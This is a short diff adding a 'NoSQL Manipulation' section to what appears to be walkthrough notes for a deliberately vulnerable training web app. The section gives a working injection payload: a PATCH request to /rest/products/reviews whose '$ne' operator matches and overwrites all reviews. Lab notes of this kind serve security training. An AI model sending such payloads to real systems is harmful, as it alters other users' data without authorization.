@@ -257,7 +257,11 @@ Comment:marsdb ~0.6,grunt ~1.0,express-jwt 0.1.3,js-yaml 3.10,sequelize ~4,sanit
 http://localhost:3000/#/contact<br>
 comment: epilogue-js<br>
 
-
+### NoSQL Manipulation
+write review<br>
+burp suite > proxy > repeater<br>
+PATCH /rest/products/reviews HTTP/1.1<br>
+{ "id": { "$ne": -1 }, "message": "NoSQL Injection!" }<br>
 
 
 
